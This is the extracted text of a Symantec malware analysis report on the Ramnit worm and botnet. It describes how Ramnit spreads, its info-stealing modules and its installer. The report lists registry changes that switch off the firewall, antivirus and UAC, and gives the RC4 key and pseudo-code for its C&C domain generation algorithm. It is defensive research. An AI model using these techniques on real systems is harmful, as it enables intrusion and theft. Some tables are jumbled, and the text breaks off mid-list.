{
    "id": "d0efcb1a-1b57-4878-89e4-f923dfff9c02",
    "created_at": "2023-10-31T02:08:33.760569Z",
    "updated_at": "2025-03-27T02:05:40.151737Z",
    "deleted_at": null,
    "sha1_hash": "0fdc99132ee6665ebf396ec641e69c64115a6c43",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-02-18T16:32:17Z",
    "file_modification_date": "2015-02-18T16:32:20Z",
    "file_size": 4135456,
    "plain_text": "### SECURITY RESPONSE\n\n# W32.Ramnit analysis\n\n###### Symantec Security Response\n\n Version 1.0 – February 24, 2015, 12:00 GMT\n\n#### It is estimated that the Ramnit botnet may consist of up to 350,000 compromised computers worldwide.\n\n\n-----\n\n### CONTENTS\n\n###### SUMMARY...................................................................... 3 Overview........................................................................ 4 Operations...................................................................... 6 Victims........................................................................... 8 Technical analysis of W32.Ramnit.B............................ 10 Overview................................................................. 10 Exploit usage.......................................................... 11 Anti-analysis........................................................... 11 Installer.................................................................. 11 Device driver........................................................... 14 Embedded DLL_1................................................... 14 DLL_2..................................................................... 16 Communications.................................................... 18 Master boot record infection routine..................... 19 Ramnit modules..................................................... 24 Detection guidance...................................................... 30 Network traffic....................................................... 30 Yara signature........................................................ 31 Appendix......................................................................34 Ramnit samples and DGA seed..............................34 DGA......................................................................... 38 Drive scanner configuration file.............................38 Recent drive scanner configuration file.................40\n\n\n-----\n\n### SUMMARY\n\n###### Ramnit is a worm that spreads through removable drives by infecting files. The worm (W32. Ramnit) was first discovered in early 2010 and later that year, a second variant of Ramnit (W32.Ramnit.B) was identified. Since then, Ramnit’s operators have made considerable upgrades to the threat, including implementing the use of modules, which was borrowed from the leaked source code of the Zeus banking Trojan (Trojan.Zbot) in May 2011.\n\n Currently, Ramnit’s operators are primarily focused on information-stealing tactics, targeting data such as passwords and online banking login credentials. They also install remote access tools on affected computers in order to maintain back door connectivity. It is estimated that the Ramnit botnet may consist of up to 350,000 compromised computers worldwide.\n\n\n-----\n\n#### Overview\n\nFigure 1 details the infection vector, overall structure, and modules of the Ramnit worm.\n\n_Figure 1. Ramnit’s infection vector, structure, and modules_\n\n\n-----\n\n1. Ramnit has been known to spread through the use of removable devices, such as USB keys and network\nshares. The attackers have also spread the threat through public File Transfer Protocol (FTP) servers,\nredirected users to exploit kits serving the threat through malicious ads on legitimate websites, and bundled\nthe malware with potentially unwanted applications (PUAs).\n\n2. Once the user’s computer is compromised and the malware is executed, a copy of the installer is written\n[to the computer’s file system. It may also use the Microsoft Windows Kernel ‘Win32k.sys’ CVE-2014-4113](http://www.securityfocus.com/bid/70364)\n[Local Privilege Escalation Vulnerability (CVE-2014-4113) in order to run with administrative rights. Ramnit](http://www.securityfocus.com/bid/70364)\nalso stores a copy of itself in memory and watches over the file system-based copy. As a result, if the\ncomputer’s antivirus software detects the worm and deletes it from disk or moves it to quarantine, the worm\nis constantly dropped back onto the file system and executed to ensure that the infection remains. A user-\nmode rootkit is also used in order to hide copies of Ramnit on the disk from the user.\n\nIn older samples of Ramnit (2011), a master boot record (MBR) infection routine was used to allow the threat\nto remain persistent. This was achieved by moving the clean MBR to the end of the disk and overwriting the\noriginal MBR with a malicious one. A rootkit driver is also used in order to silently prevent write operations\nto specific sectors of the drive such as the MBR. This is used to hamper remediation actions. The sample also\ncontained a compressed copy of the Ramnit installer, which was loaded into memory during the start-up\nprocess. This was possible as the malicious MBR removed page-write protection.\n\n3. The older samples of Ramnit also contained a file infection routine which attempts to infect EXE, DLL,\nHTM, and HTML files. The threat does this by listing all available drives on the compromised computer. It\nspecifically targets removable drives and fixed drives, such as the local disk.\n\nIf the threat finds an EXE or DLL file, it loads a copy of the file into memory and performs several verification\nchecks on it. Then, it patches the in-memory version of the file by creating a new section and modifying the\nentry point. The newly appended section contains two parts. The first part decrypts a copy of Ramnit, drops\nit to the file system, launches it, and jumps back to the original entry point. The second part is the encrypted\ncopy of Ramnit. It generates between 300 and 500 bytes of garbage data to append to the end of the file,\nalong with a marker to avoid re-infection.\n\nFor HTM and HTML files, the threat injects a VBScript into the files in order to write a copy of the Ramnit\ninstaller to the file system and launch it. Similar to the DLL and EXE infection routine, the threat uses a\nmarker to avoid re-infection.\n\n[Infected files are detected by Symantec as W32.Ramnit!inf, W32.Ramnit.C!inf, and W32.Ramnit.D!inf, and](http://www.symantec.com/security_response/writeup.jsp?docid=2010-011923-3800-99)\n[infected web pages are detected as W32.Ramnit!html.](http://www.symantec.com/security_response/writeup.jsp?docid=2010-012006-3513-99)\n\n4. The Ramnit installer handles the installation routine to ensure that Ramnit remains persistent every time\nthe computer restarts. It contains three components. The first is a device driver, which is dropped to the file\nsystem and loaded as a service called “Microsoft Windows Service”. The installer makes a copy of itself on\nthe file system and modifies the registry to ensure that the driver component is loaded after the computer\nrestarts. The second and third components are DLL files labelled DLL_1 and DLL_2 which are injected into\nmemory.\n\nThe device driver is used to modify the service descriptor table (SDT) in order to hook APIs used by Windows\nwhen interacting with the computer’s registry.\n\n5. DLL_1 acts as a bridge between DLL_2 and the storage container or log file. DLL_2 communicates with DLL_1\nusing a named pipe to request and receive modules from a remote command-and-control (C&C) server.\nDLL_1 is responsible for storing the received modules in the storage container in an encrypted form and has\nthe ability to load and execute the modules when requested.\n\n6. The DLL_2 component acts as a back door. It attempts to establish a connection to the C&C server using a\ncustom domain generation algorithm (DGA). It has the ability to receive and execute commands on behalf\nof the attacker and can request modules that are passed to DLL_1 for storing and loading. There are\napproximately 21 supported commands that DLL_2 can receive. These include capturing screenshots of the\n\n\n-----\n\ninfected computer, uploading cookies, requesting modules or module lists, and gathering computer-related\ninformation. DLL_2 can also perform a “system kill” command, which deletes root registry keys to prevent\nthe computer from starting up.\n\n7. Once the DLL components are loaded in memory, the threat begins to communicate with the C&C server. The\nC&C server houses all of the available modules which the malware can download. The source code for the\nmodules appears to have been heavily based on the Zeus banking Trojan after it was leaked into the public\ndomain.\n\nEach module has a particular function which helps the malware steal information from the victim. Of all the\nmodules analyzed, the spy module is the only exception where the domain generated using the DGA isn’t\nused as the C&C server. For the spy module, a separate configuration file is downloaded which specifies the\nC&C server. All stolen information is sent to this C&C server instead of the one produced by the DGA.\n\nThe identified modules include:\n\na. Cookie grabbers: Lets the attackers hijack online sessions for banking and social media sites. This is\nachieved by stealing cookies from browsers such as Chrome, Firefox, Internet Explorer, Safari, and\nOpera. The cookies are stored in an archive file and are submitted to the C&C server.\n\nb. FTP grabber: Allows the attackers to gather login credentials for a large number of FTP clients.\n\nc. Spy module: Lets the attackers monitor websites that victims frequently visit. The module contains a\nconfiguration file which triggers when the victim visits specific sites such as online banking sites. It then\nacts as a man-in-the-browser (MITB) by injecting code into the web page and requesting that users\nsubmit more sensitive information than what would normally be expected by their bank. This\ncould include full credit card details which could be used by the attackers to authorize money transfers\nfrom the victim’s bank account.\n\nd. Virtual network computing (VNC) Module: Gives the attackers remote access to the computer.\n\ne. Drive scanner: Allows the attackers to steal files from the compromised computer. The module uses\na configuration file and scans specific folders for files that may contain login credentials. These files are\narchived and submitted to the C&C server.\n\nf. Anonymous FTP server: Lets attackers remotely connect to the compromised computer and browse the\nfile system. The FTP server gives the attackers the ability to upload, download, or delete files\nand execute commands.\n\n#### Operations\n\nWhen Ramnit was first discovered in 2010, its main method of distribution was by infecting files through\nremovable drives. In November 2010, a second variant of Ramnit, detected by Symantec as W32.Ramnit.B,\n[was discovered. This variant propagated through an exploit for the Microsoft Windows Shortcut ‘LNK/PIF’ Files](http://www.securityfocus.com/bid/41732)\n[Automatic File Execution Vulnerability (CVE-2010-2568).](http://www.securityfocus.com/bid/41732)\n\nBy May 2011, the operators made significant enhancements to Ramnit, adding modules based on the leaked\nsource code from Zeus. In 2012, Ramnit was reportedly spreading through the Blackhole exploit kit hosted on\ncompromised websites and social media pages, similar to Zeus’ method of propagation. In 2013 and 2014,\nSymantec identified that Ramnit was being distributed through exploits for the following vulnerabilities:\n\n           - [Oracle Java SE Remote Code Execution Vulnerability (CVE-2013-1493)](http://www.securityfocus.com/bid/58238)\n\n           - [Oracle Java Runtime Environment Multiple Remote Code Execution Vulnerabilities (CVE-2013-0422)](http://www.securityfocus.com/bid/57246)\n\nPublic FTP servers were also used at this time to distribute the malware. Symantec has also identified the\npossible use of potentially unwanted applications (PUAs), which may be responsible for further distribution of\nRamnit.\n\n\n-----\n\n### VICTIMS\n\n## While the amount of infected computers has decreased over time, the Ramnit botnet is still active.\n\n\n-----\n\n#### Victims\n\nThe regions that experienced most of\nthe recent Ramnit infections are India,\nIndonesia, Vietnam, Bangladesh, the US,\nthe Philippines, Egypt, Turkey, and Brazil.\n\nWhile the amount of infected computers\nhas decreased over time, the Ramnit\nbotnet is still active. In May 2014,\nSymantec observed around 8,000 daily\ndetections, whereas in November, this\nnumber was closer to 6,700.\n\nOur analysis shows that the number\nof detections that occurred during\nthe weekend is around 20-25 percent\nsmaller than the number of detections\nthat occurred during weekdays. This\nmay indicate that this part of the botnet\nconsists of computers that are owned by\ncompanies, since they are usually turned\noff during weekends.\n\n_Figure 2. Ramnit infections by region_\n\n_Figure 3. Ramnit detections per month_\n\n\n-----\n\n### TECHNICAL ANALYSIS OF W32.RAMNIT.B\n\n## The purpose of the installer is to drop the device driver and launch it as a service. It also injects DLLs into any newly created process instances of svchost.exe or\n\n\n-----\n\n#### Technical analysis of W32.Ramnit.B\n\n##### Overview\n\nThe following list contains vendor detections that identify the threat:\n\n       - Symantec: W32.Ramnit.B\n\n        - Microsoft: Trojan:Win32/Ramnit.A\n\n       - ESET-NOD32: Win32/Ramnit.A\n\n        - Fortinet: W32/Blocker.DMCS!tr\n\n        - Kaspersky Lab: Trojan-Ransom.Win32.Blocker.dmcs\n\n        - Malwarebytes: Trojan.Downloader.ED\n\n       - McAfee: RDN/Ransom!ea\n\n        - McAfee-GW-Edition: Heuristic.BehavesLike.Win32.Downloader.D\n\n       - Trend Micro: TROJ_SPNV.03B414\n\n       - AVG: PSW.Banker6.BFMD\n\nThe following list contains artefacts used as part of the analysis:\n\n        - File name: iryqxgxk.exe\n\n       - MD5: 056af1afdc305dd978c728653c4ee08b\n\n       - SHA1: 04ec60dacd3bcb2d6dd2e973e2e165e8e5c7ccec\n\n       - SHA256: 3ee0f395cf30caf28ca6ccfbb0ca14f4392aad6e97c5e3a4a2bfc621dfaf5c5e\n\n        - Size: 116,224 bytes\n\n         - Purpose: Main installer. Drops device driver and launches it as a service. Injects two DLLs into any newly\ncreated process instances of svchost.exe or iexplorer.exe\n\nThe following lists contain artefacts extracted/downloaded by the threat during the course of the analysis:\n\n        - Source: Dropped device driver\n\n       - File name: [EIGHT PSEUDO-RANDOM CHARACTERS].sys\n\n       - MD5: a6d351093f75d16c574db31cdf736153\n\n       - SHA1: fb12b984055b09d29d18291bd2782ff6ec63b047\n\n       - SHA256: c1293f8dd8a243391d087742fc22c99b8263f70c6937f784c15e9e20252b38ae\n\n        - Size: 15,360 bytes\n\n        - Purpose: Restores the SDT and hooks registry-related routines\n\n        - Source: Injected DLL_1\n\n         - First seen: January 9, 2014 (compile time)\n\n        - File name: N/A\n\n       - MD5: d38eaff5022a00ccdacdb00c8e3d351a\n\n       - SHA1: 79ed0ae6240a11482d018e118308c217d32b17f1\n\n       - SHA256: d38a31651002c16138277c91863ef0bda88b01252be2121d969d446371b4a1ae\n\n        - Size: 35,328 bytes\n\n        - Purpose: Requests and receives modules from DLL_2 through a named pipe. Encrypts received modules and\nsaves them to a log file. Also responsible for decrypting and loading encrypted modules from the saved file.\n\n        - Source: Injected DLL_2\n\n         - First seen: January 9, 2014 (compile time)\n\n        - File name: N/A\n\n       - MD5: 31d3b232da7f06b0a767141cf69f0524\n\n       - SHA1: 86a4ddeb7b3f533965110c5fa0c9404d975f834c\n\n       - SHA256: 237ac6a45e840fb4911f7a55921380fcfdd672c766072e47f196a514621f4040\n\n\n-----\n\n        - Size: 102,400 bytes\n\n        - Purpose: Downloads modules from a remote server and sends them to DLL_1 through a named pipe.\n\n##### Exploit usage\n\n        - Ramnit is reportedly spread through a CVE-2010-2568 exploit.\n\n        - Recent variants of Ramnit have used CVE-2014-4113 in order to perform privilege escalation.\n\n##### Anti-analysis\n\nThe following list details the reverse-engineering challenges discovered during the course of the analysis:\n\n        - Anti-debug: Yes\n\n        - Anti-emulation: Yes\n\n        - Anti-VM: No\n\n        - Packing: Yes\n\n        - Obfuscation: No\n\n        - Host-based encryption: Yes (RC4)\n\n        - Network-based encryption: Yes (RC4)\n\n         - Server-side tricks: Yes\n\n###### Packing/compression\n\nThe dropped device driver is a VB-pcode program packed by PECompact. The VB program injects the installer\ninto processes. The injected installer is UPX-packed and contains three PE files−one device driver and two DLLs.\n\n###### Encryption\n\n Host\n\nThe following is an artefact which is created by the threat. Encrypted modules downloaded from a remote server\nare stored in the following location:\n\n        - %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\[EIGHT PSEUDO-RANDOM\nCHARACTERS].log\n\nThe modules are decrypted by DLL_1.\n\n###### Network\n\nAll received modules are encrypted using standard RC4 encryption with the key “black”. Modules are decrypted\nand sent to DLL_1, where they are verified, re-encrypted, and stored in the log file. Please refer to the DLL_2\nsection and the appendix for more information.\n\n##### Installer\n\nThe purpose of the installer is to drop the device driver and launch it as a service. It also injects DLLs into any\nnewly created process instances of svchost.exe or iexplorer.exe.\n\n       - MD5: 056af1afdc305dd978c728653c4ee08b\n\n       - SHA1: 04ec60dacd3bcb2d6dd2e973e2e165e8e5c7ccec\n\n       - SHA256: 3ee0f395cf30caf28ca6ccfbb0ca14f4392aad6e97c5e3a4a2bfc621dfaf5c5e\n\n        - Size: 116,224 bytes\n\n\n-----\n\n###### Functionality\n\nWhen executed, the installer attempts to elevate privileges and create a security descriptor. The actions that\nfollow depend on which parameters are provided to the installer.\n\n###### No parameter\n\nWhen no parameter is supplied, the installer first creates a mutex by using the initialized security descriptor. The\nmutex is generated by a combination of a hard coded seed (0x14D8) and the volume serial number of the root\ndrive. The following format is used:\n\n      - {%08X-%04X-%04X-%04X-%08X%04X}\n\nNext, the installer copies itself to %UserProfile%\\Application Data\\[EIGHT PSEUDO-RANDOM CHARACTERS].exe\nand attempts to locate the path for svchost.exe and iexplore.exe.\n\nIt then attempts to hook the following APIs with the purpose of injecting embedded DLL modules into the\nsvchost.exe and iexplore.exe processes when launched.\n\n        - ZwWriteVirtualMemory\n\n        - ZwCreateUserProcess\n\nIf the mutex does not exist, the installer attempts to launch the embedded modules in order to trigger the hook\nfor injection. It then removes the hook.\n\nFinally, the installer launches the copy of itself in %UserProfile%\\Application Data using the “elevate”\nparameter.\n\n###### Elevate parameter\n\nWhen the “elevate” parameter is supplied, the installer creates a mutex as previously described, using 0x14D9\nas the seed value. Next, the installer launches itself again using the “admin” parameter.\n\n###### Admin parameter\n\nWhen the “admin” parameter is supplied, the installer creates a mutex as previously described, using 0x14D7 as\nthe seed value. The installer force-exits if it fails to successfully create the mutex.\n\nThen, the installer attempts to lower the computer’s security by modifying the following registry entries and\nsubkeys:\n\nSets\n\n       - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\”EnableLUA” = “0”\n\n        - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\”FirewallOverride” = “1”\n\n        - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\”AntiVirusOverride” = “1”\n\n        - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Svc\\”AntiVirusOverride” = “1”\n\n        - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wscsvc\\”Start” = “4”\n\n        - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\Stan\ndardProfile\\”EnableFirewall” = “0”\n\n        - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\Stan\ndardProfile\\”DoNotAllowExceptions” = “0”\n\n        - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\Stan\ndardProfile\\”DisableNotifications” = “1”\n\nDeletes\n\n       - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Defender\n\nNext, the installer drops the driver file and launches it as a service called “Microsoft Windows Service”. At this\n\n\n-----\n\n|Table 1 details the files created during the installation routine and their purpose.|Col2|Col3|Col4|\n|---|---|---|---|\n|Table 1. Files created during installation process||||\n|Action|Path|File name|Purpose|\n|Create/delete|%UserProfile%\\Local Settings\\Temp|[EIGHT PSEUDO-RANDOM CHARACTERS].sys|Dropped device driver|\n|Create|%UserProfile%\\Local Settings\\Temp|[EIGHT PSEUDO-RANDOM CHARACTERS].exe|Copy of itself|\n\n|Table 2. Registry changes during installation|Col2|Col3|Col4|\n|---|---|---|---|\n|Action|Registry key|Name|Type|\n|Modify|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\ system|EnableLUA|DW|\n|Create|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center|FirewallOverride|DW|\n|Create|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center|AntiVirusOverride|DW|\n|Create|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Svc|AntiVirusOverride|DW|\n|Modify|HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wscsvc|Start|DW|\n|Modify|HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- eters\\FirewallPolicy\\StandardProfile|EnableFirewall|DW|\n|Modify|HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- eters\\FirewallPolicy\\StandardProfile|DoNotAllowExceptions|DW|\n|Modify|HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- eters\\FirewallPolicy\\StandardProfile|DisableNotifications|DW|\n|Delete|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Windows Defender||\n\n\npoint, the installer file in %UserProfile%\\Application Data is removed, leaving a copy of the driver in the file\nsystem.\n\nTo ensure persistence, the threat modifies the registry by setting the following registry subkey:\n\n       - HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n\nNext, the installer stops the “RapportMgmtService” service, ends the “Rapport” process, and removes all files\nunder %ProgramFiles%\\Trusteer. Finally, the installer deletes the “wscsv” service.\n\nIf the installer successfully modified the registry for persistence, it may then restart the computer.\n\n###### Installation\n\nThe installer module may make the following file/registry/memory modifications during the installation\nprocedure.\n\n###### Persistence\n\nThe following list includes any modifications made to allow the threat to run every time the computer restarts:\n\n        - Action: Set\n\n       - Registry subkey: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\n\n        - Name: UserInit\n\n         - Type: String\n\n       - Data: %UserProfile%\\Application Data\\[EIGHT PSEUDO-RANDOM CHARACTERS].exe\n\n###### Files\n\nTable 1 details the files created during the installation routine and their purpose.\n\n_Table 1. Files created during installation process_\n\nAction Path File name Purpose\n\nCreate/delete %UserProfile%\\Local Settings\\Temp [EIGHT PSEUDO-RANDOM CHARACTERS].sys Dropped device driver\n\nCreate %UserProfile%\\Local Settings\\Temp [EIGHT PSEUDO-RANDOM CHARACTERS].exe Copy of itself\n\n###### Registry\n\nTable 2 details registry changes on the computer and their purpose.\n\n_Table 2. Registry changes during installation_\n\nAction Registry key Name Type\n\nModify HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\ EnableLUA DW\nsystem\n\nCreate HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center FirewallOverride DW\n\nCreate HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center AntiVirusOverride DW\n\nCreate HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Svc AntiVirusOverride DW\n\nModify HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wscsvc Start DW\n\nModify HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- EnableFirewall DW\neters\\FirewallPolicy\\StandardProfile\n\nModify HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- DoNotAllowExceptions DW\neters\\FirewallPolicy\\StandardProfile\n\nModify HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Param- DisableNotifications DW\neters\\FirewallPolicy\\StandardProfile\n\nDelete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Windows Defender\n\n\n-----\n\n|Table 3. Processes created during installation|Col2|Col3|\n|---|---|---|\n|Action|Process|Purpose|\n|Create|svchost.exe or iexplore.exe|Inject DLL_1|\n|Create|svchost.exe or iexplore.exe|Inject DLL_2|\n\n\n###### Processes Table 3. Processes created during installation\n\nAction Process Purpose\n\nTable 3 details any processes created\nduring the installation routine and their Create svchost.exe or iexplore.exe Inject DLL_1\npurpose. Create svchost.exe or iexplore.exe Inject DLL_2\n\n###### Services\n\nThe following list gives details on the service created during the installation routine and its purpose.\n\n        - Action: Create\n\n        - Service: Microsoft Windows Service\n\n        - Purpose: Launches the dropped device driver\n\n##### Device driver\n\nThe main purpose of the device driver is to modify the SDT and hook registry-related routines.\n\n       - MD5: a6d351093f75d16c574db31cdf736153\n\n       - SHA1: fb12b984055b09d29d18291bd2782ff6ec63b047\n\n       - SHA256: c1293f8dd8a243391d087742fc22c99b8263f70c6937f784c15e9e20252b38ae\n\n        - Size: 15,360 bytes\n###### Functionality\n\n         - Tries to modify the SDT and hooks API calls in ntkrnlpa.exe and win32k.sys\n\n        - Creates a device handler (\\Device\\631D2408D44C4f47AC647AB96987D4D5) to override the following:\n\n        - 0x222400: End process\n\n         - 0x222404: Set the function lists which are called by the hooked registry-related routines\n\n        - 0x222408: Currently unknown\n\n        - Hooks the following APIs:\n\n       - ZwOpenKey\n\n       - ZwOpenKeyEx\n\n       - ZwOpenKeyTransacted\n\n       - ZwOpenKeyTransactedEx\n\n       - ZwCreateKey\n\n        - ZwCreateKeyTransacted\n\n         - Hooked routines call a pre-defined set of function lists and set the ACCESS_MASK before calling the original\nroutine.\n\n##### Embedded DLL_1\n\nThe DLL_1 component acts as a bridge between DLL_2 and a log file. It communicates with DLL_2 using a named\npipe to request and receive modules from a remote C&C server. DLL_1 is responsible for storing the received\nmodules in an encrypted form in a log file. It also has the ability to load, decrypt, and execute these external\nmodules.\n\n       - MD5: d38eaff5022a00ccdacdb00c8e3d351a\n\n       - SHA1: 79ed0ae6240a11482d018e118308c217d32b17f1\n\n       - SHA256: d38a31651002c16138277c91863ef0bda88b01252be2121d969d446371b4a1ae\n\n        - Size: 35,328 bytes\n###### Functionality\n\nThe embedded DLL_1 component can perform the following actions:\n\n         - Adjust privileges and initialize security descriptors, similar to the installer, and then create a mutex using the\nhard-coded seed 0x1EC4\n\n\n-----\n\n|Table 4. Block structure|Col2|Col3|\n|---|---|---|\n|Offset|size|description|\n|0x0|4|Hash for decrypted PE file|\n|0x4|4|Flag, 1 means “could be loaded”|\n|0x8|4|Size of encrypted data|\n|0xC|4|Hash for encrypted data|\n\n|Table 5. Encrypted data structure|Col2|Col3|\n|---|---|---|\n|Offset|size|description|\n|0x0|0x4|Magic, 0xC581F364|\n|0x4|0x14|Module name|\n|0x18|0x100|Module description|\n|0x118|0x4|Time stamp|\n|0x11C|0x4|Hash for decrypted|\n|0x120|Varies|PE module|\n\n\n\n         - Read the installer into an allocated buffer and then create three threads.\n\n         - Wait for an event generated by seed 0x18BF. This event will be created and set in DLL_2\n\n###### Thread_1_LaunchModulesFromLogfile\n\nThis thread is used to decrypt and launch the log file stored\nin %UserProfile%\\Application Folder. The file name is\n\n_Table 4. Block structure_\n\ngenerated using the hard-coded seed 0xEC6.\n\nOffset size description\n\nModules in the log file are encrypted and stored in 0x0 4 Hash for decrypted PE file\nindividual blocks using the structure in Tables 4 and 5.\n\n0x4 4 Flag, 1 means “could be loaded”\n\nBefore module decryption, the thread attempts to verify the 0x8 4 Size of encrypted data\nlog file by checking its hashes. The following pseudo-code 0xC 4 Hash for encrypted data\ndetails how the hashes are calculated:\n```\n           Hash table is generated at 0x10003F02\n\n```\n`h = 0xFFFFFFFF` _Table 5. Encrypted data structure_\n```\n            for i in range(0x10, block[0x8]):\n\n```\nOffset size description\n```\n              d = h >> 8\n\n```\n`block[i] = block[i] ^ (h &` 0x0 0x4 Magic, 0xC581F364\n`0xFF)` 0x4 0x14 Module name\n`h = hash _ table _ 256[h & 0xFF]` 0x18 0x100 Module description\n```\n           ^ d\n\n```\n0x118 0x4 Time stamp\n\n0x11C 0x4 Hash for decrypted\n\nThe decryption algorithm is RC4. The key is a string (length\n0x14) generated pseudo-randomly by seed 0x2A8B53 and 0x120 Varies PE module\nthe serial number of the root volume.\n\nIf module decryption is successful, the thread attempts to execute the module by calling the following functions:\n\n        - Entry Point\n\n         - Export Functions (if they exist)\n\n       - ModuleCode\n\n       - CommandRoutine\n\n        - StartRoutine\n\nA list of loaded modules is maintained in memory. Each module has an indicator, which is used to identify a\n“module loaded” state used in conjunction with a marker in the block structure at offset 0x4. This is used to\navoid re-loading duplicate modules. After a module is loaded, the marker in the block structure is modified to\nindicate that this has occurred.\n\nFor each module in the log file, the thread runs the layer_1 decryption first. Then, it performs a check to see\nwhether the marker exists in the decrypted modules. If not, the threat launches StopRoutine to unload the\nmarker. If the marker for the module is set to “1” in the block structure and the marker does not exist in the\nmaintained list in memory, the thread will launch the module and call the export function names, as previously\nlisted. After that, the thread adds the module to the loaded modules list in memory.\n\n###### Thread_2_ConnectToPipeForModules\n\nWhen called, this thread performs the following actions:\n\n        - Create a named pipe as \\\\.\\pipe\\[EIGHT PSEUDO-RANDOM CHARACTERS]. The name is generated using seed\n0xEFA. This same seed is used in DLL_2.\n\n       - Create Thread_2_1_Request_And_SaveModules\n\n\n-----\n\n###### Thread_2_1_Request_And_SaveModules\n\nThis thread is used to receive encrypted modules and write them to the log file. It fetches new modules by\nperforming the following actions:\n\n        - Send “\\x23” to the named pipe. The response contains the modules.\n\n         - If the modules are needed, the thread uses RC4 to decrypt the binaries received. The key (“black”) is used for\ndecryption.\n\n         - Send decrypted binaries to the pipe and read the received data, which is detailed in the content of the module.\nThe module is then encrypted and written to the log file.\n\n###### Thread_3_Restart_Installer\n\nEvery 0.5 seconds, the thread checks DLL_2’s mutex to ensure it is still loaded. If the mutex isn’t found, the\nthread attempts to launch the installer.\n\n##### DLL_2\n\nThe DLL_2 component acts as a back door. It connects to the remote C&C server to receive and execute\ncommands, and request additional modules. If the component is running in “listening mode,” it binds to a hard-\ncoded port (disabled in the sample).\n\n       - MD5: 31d3b232da7f06b0a767141cf69f0524\n\n       - SHA1: 86a4ddeb7b3f533965110c5fa0c9404d975f834c\n\n       - SHA256: 237ac6a45e840fb4911f7a55921380fcfdd672c766072e47f196a514621f4040\n\n        - Size: 102,400 bytes\n###### Functionality\n\nDLL_2 first creates a thread to protect itself. It does this by performing the following actions:\n\n         - Repeatedly set registry subkeys to lower the security settings and ensure that the subkey used for persistence\nis intact.\n\n         - Copy the installer into memory. It repeatedly checks if the installer copy on the disk is present. If the copy is\nmissing, the component drops a copy of the installer to disk and launch the installer to re-infect the computer.\n\nThis component uses a DGA to generate the remote C&C domain. A hard coded seed (0x10019004) is initialized\nto generate domains. The amount of generated domains is limited to 300. The pseudo-random algorithm is the\nsame as the one used to generate mutex, event, and file names and looks like the following:\n```\n           def pseudo _ random(seed, max):\n             div _ 1  = seed / 0x1F31D\n             mod _ 1  = seed % 0x1F31D\n             mull _ 1  = (mod _ 1 * 0x41A7) & 0xFFFFFFFF \n             mull _ 2  = (div _ 1 * 0xB14) & 0xFFFFFFFF\n             new _ seed = (mull _ 1 - mull _ 2) & 0xFFFFFFFF\n             val _ rand = new _ seed % max\n             return (val _ rand, new _ seed)\n\n```\nWhen a domain is generated, DLL_2 performs the following steps to verify that the domain is valid:\n\n1. Encrypts two MD5s using RC4. The key used is “black”. The first MD5 is calculated by concatenating the\nfollowing data together:\n\n        - VolumeSerialNumber\n\n         - VersionInformation.dwBuildNumber\n\n         - VersionInformation.dwMajorVersion\n\n\n-----\n\n|Table 6. Block format structure|Col2|\n|---|---|\n|offset|purpose|\n|Buffer[0]|Mode, set to 0xE2 during analysis|\n|Buffer[0:]|Blocks, one by one|\n\n|Table 7. Block structure|Col2|\n|---|---|\n|Block[0]|Byte, type, here it is 00|\n|Block[1]|Dword, length for the following data|\n|Block[5:]|Bytes, data|\n\n\n\n         - VersionInformation.dwMinorVersion\n\n        - SystemInfo.anonymous_0\n\n         - SystemInfo.dwActiveProcessorMask\n\n        - SystemInfo.dwNumberOfProcessors\n\n         - SystemInfo.dwProcessorType\n\n         - SystemInfo.wProcessorLevel\n\n         - SystemInfo.wProcessorRevision _Table 6. Block format structure_\n\n        - ComputerName\n\noffset purpose\n\nThe second MD5 is calculated by working out the MD5 of\n\nBuffer[0] Mode, set to 0xE2 during analysis\n\n“45Bn99gT” and the first MD5.\n\nBuffer[0:] Blocks, one by one\n\n2. Groups the two MD5s in blocks. The block format has the\nstructure as shown in Table 6.\n\n_Table 7. Block structure_\n\nThe structure of each block is as shown in Table 7.\n\nBlock[0] Byte, type, here it is 00\n\n3. 